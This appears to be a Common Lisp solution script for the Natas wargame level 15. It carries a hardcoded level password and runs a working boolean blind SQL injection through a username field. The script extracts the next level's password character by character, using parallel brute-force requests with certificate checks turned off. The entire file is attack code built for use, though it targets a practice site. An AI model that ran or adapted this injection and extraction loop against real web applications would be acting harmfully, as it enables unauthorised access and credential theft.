(in-package #:advent-of-code-2024.misc)

(defparameter *natas15-user* "natas15")
(defparameter *natas15-password* "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
(defparameter *natas15-url* "")

(defparameter *valid-chars* '#.(loop
                                :for c :from (char-code #\0) :to (char-code #\z)
                                :for ch := (code-char c)
                                :when (alphanumericp ch)
                                  :collect ch))

(defun send-request (pass ch n)
  (let ((response (dexador:post *natas15-url*
                                :headers '(("Content-Type" . "application/x-www-form-urlencoded"))
                                :basic-auth (cons *natas15-user* *natas15-password*)
                                :content `(("username" . ,(format nil "natas16\" AND BINARY ~
substring(password,1,~d) = '~a~c' -- " n pass ch)))
                                :insecure t
                                :connect-timeout 15
                                :use-connection-pool t)))
    (search "This user exists." response)))

(defun brute-force (&key (password-length 32))
  (let ((lparallel:*kernel* (lparallel:make-kernel 8)))
   (loop
     :for pass := "" :then (format nil "~a~c" pass next)
     :for n :from 1 :to password-length
     :for next := (lparallel:pfind-if (lambda (ch) (send-request pass ch n))
                                      *valid-chars*)
     :do (format t "n: ~a pass: ~a next: ~c~%" n pass next)
     :finally (return pass))))
